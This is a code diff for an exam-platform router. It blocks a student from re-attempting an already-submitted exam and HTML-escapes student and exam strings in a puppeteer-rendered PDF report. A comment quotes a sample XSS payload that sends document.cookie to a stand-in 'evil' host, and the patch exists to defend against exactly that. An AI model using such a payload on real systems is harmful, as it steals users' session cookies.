@@ -141,8 +141,16 @@ router.post('/attempt', requireAuth, async (req: Request, res: Response) => {
 
     let attempt = await getActiveAttempt(examId, user.id);
 
-    // If no active attempt, start one
+    // If no active attempt, start one — but ONLY if the student hasn't already
+    // submitted this exam. Without this guard a student could call /attempt
+    // again after submitting and silently overwrite their previous result.
     if (!attempt) {
+      const userAttempts = await getUserAttempts(user.id);
+      const submittedAlready = userAttempts.find((a) => a.exam_id === examId && a.submitted);
+      if (submittedAlready) {
+        return res.status(409).json({ error: 'Already submitted', code: 'ALREADY_SUBMITTED' });
+      }
+
       const exam = await getOtisakExamById(examId);
       if (!exam) {
         return res.status(404).json({ error: 'Exam not found' });
@@ -395,6 +403,18 @@ router.get('/report/:userId/pdf', requireAuth, requireRole(['admin', 'assistant'
       ['copy_attempt', 'cut_attempt', 'paste_attempt', 'page_blur', 'mouse_leave_window', 'devtools_attempt', 'print_attempt', 'tab_switch'].includes(e.event_type)
     );
 
+    // ALL user/admin-controlled strings going into this HTML must be escaped:
+    // exam title, question text, answer text, student.name/email, text_answer
+    // (free-text student input!), subject_name. Otherwise an enterprising
+    // student types <script>fetch('//evil/'+document.cookie)</script> and the
+    // PDF rendering page in puppeteer happily executes it.
+    const escapeHtml = (s: unknown): string => {
+      if (s === null || s === undefined) return '';
+      return String(s).replace(/[&<>"']/g, (c) => (
+        { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' } as Record<string, string>
+      )[c]);
+    };
+
     const questionsHtml = results?.questions.map((q, idx) => {
       const correct = q.points_awarded > 0;
       const answersHtml = q.answers.map((a) => {
@@ -405,7 +425,7 @@ router.get('/report/:userId/pdf', requireAuth, requireRole(['admin', 'assistant'
         const icon = isCorrect ? '&#10003;' : selected && !isCorrect ? '&#10007;' : '&nbsp;&nbsp;';
         return `<div style="padding:6px 10px;margin:3px 0;border-radius:6px;background:${bg};border:1px solid ${border};font-size:11px;color:#e5e7eb;display:flex;align-items:center;gap:8px;">
           <span style="font-weight:bold;color:${isCorrect ? '#34d399' : selected ? '#f87171' : '#6b7280'};font-size:13px;">${icon}</span>
-          ${a.text}
+          ${escapeHtml(a.text)}
           ${selected && !isCorrect ? '<span style="margin-left:auto;color:#f87171;font-size:9px;">VAS ODGOVOR</span>' : ''}
           ${isCorrect && !selected ? '<span style="margin-left:auto;color:#34d399;font-size:9px;">TACAN</span>' : ''}
         </div>`;
@@ -414,15 +434,14 @@ router.get('/report/:userId/pdf', requireAuth, requireRole(['admin', 'assistant'
       return `<div style="margin-bottom:16px;padding:14px;border-radius:10px;border:1px solid ${correct ? '#065f46' : '#7f1d1d'};background:${correct ? 'rgba(5,46,22,0.3)' : 'rgba(69,10,10,0.3)'};">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
           <span style="font-size:10px;text-transform:uppercase;letter-spacing:2px;color:${correct ? '#34d399' : '#f87171'};">Pitanje ${idx + 1} ${correct ? '&#10003;' : '&#10007;'}</span>
-          <span style="font-size:11px;font-weight:bold;color:${correct ? '#34d399' : '#f87171'};">${q.points_awarded}/${Number(q.question.points)} bod.</span>
+          <span style="font-size:11px;font-weight:bold;color:${correct ? '#34d399' : '#f87171'};">${Number(q.points_awarded)}/${Number(q.question.points)} bod.</span>
         </div>
-        <p style="font-size:12px;color:#f1f5f9;margin-bottom:10px;line-height:1.5;">${q.question.text}</p>
-        ${q.question.type === 'open_text' ? `<div style="padding:8px 10px;border-radius:6px;background:#111827;border:1px solid #1f2937;font-size:11px;color:#94a3b8;"><strong>Odgovor:</strong> ${q.text_answer || '<em>Bez odgovora</em>'}</div>` : answersHtml}
+        <p style="font-size:12px;color:#f1f5f9;margin-bottom:10px;line-height:1.5;">${escapeHtml(q.question.text)}</p>
+        ${q.question.type === 'open_text' ? `<div style="padding:8px 10px;border-radius:6px;background:#111827;border:1px solid #1f2937;font-size:11px;color:#94a3b8;"><strong>Odgovor:</strong> ${q.text_answer ? escapeHtml(q.text_answer) : '<em>Bez odgovora</em>'}</div>` : answersHtml}
       </div>`;
     }).join('') || '';
 
     const enrichedActivity = await enrichActivityEventData(examId, activityLog);
-    const escapeHtml = (s: string) => s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' } as Record<string, string>)[c]);
     const timelineHtml = enrichedActivity.slice(0, 200).map((e) => {
       const isSuspicious = ['copy_attempt', 'cut_attempt', 'paste_attempt', 'page_blur', 'mouse_leave_window', 'devtools_attempt', 'print_attempt'].includes(e.event_type);
       const color = isSuspicious ? '#f87171' : '#94a3b8';
@@ -440,7 +459,7 @@ router.get('/report/:userId/pdf', requireAuth, requireRole(['admin', 'assistant'
 <html>
 <head>
 <meta charset="UTF-8">
-<title>OTISAK Izvestaj - ${student.name || student.email}</title>
+<title>OTISAK Izvestaj - ${escapeHtml(student.name || student.email)}</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
   @page { size: A4; margin: 0; }
@@ -470,14 +489,14 @@ router.get('/report/:userId/pdf', requireAuth, requireRole(['admin', 'assistant'
   <div style="display:flex;gap:16px;margin-bottom:24px;">
     <div style="flex:1;padding:16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;">
       <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#3b82f6;margin-bottom:8px;">Student</div>
-      <div style="font-size:16px;font-weight:600;color:#f1f5f9;">${student.name || 'N/A'}</div>
-      <div style="font-size:11px;color:#60a5fa;font-family:'JetBrains Mono',monospace;margin-top:2px;">${student.index_number || ''}</div>
-      <div style="font-size:10px;color:#6b7280;margin-top:4px;">${student.email}</div>
+      <div style="font-size:16px;font-weight:600;color:#f1f5f9;">${escapeHtml(student.name) || 'N/A'}</div>
+      <div style="font-size:11px;color:#60a5fa;font-family:'JetBrains Mono',monospace;margin-top:2px;">${escapeHtml(student.index_number || '')}</div>
+      <div style="font-size:10px;color:#6b7280;margin-top:4px;">${escapeHtml(student.email)}</div>
     </div>
     <div style="flex:1;padding:16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;">
       <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#3b82f6;margin-bottom:8px;">Ispit</div>
-      <div style="font-size:16px;font-weight:600;color:#f1f5f9;">${exam.title}</div>
-      <div style="font-size:11px;color:#94a3b8;margin-top:2px;">${exam.subject_name || ''}</div>
+      <div style="font-size:16px;font-weight:600;color:#f1f5f9;">${escapeHtml(exam.title)}</div>
+      <div style="font-size:11px;color:#94a3b8;margin-top:2px;">${escapeHtml(exam.subject_name || '')}</div>
       <div style="font-size:10px;color:#6b7280;margin-top:4px;">${formatDate(attempt.started_at)} | Trajanje: ${formatDuration(Number(attempt.time_spent_seconds))}</div>
     </div>
   </div>
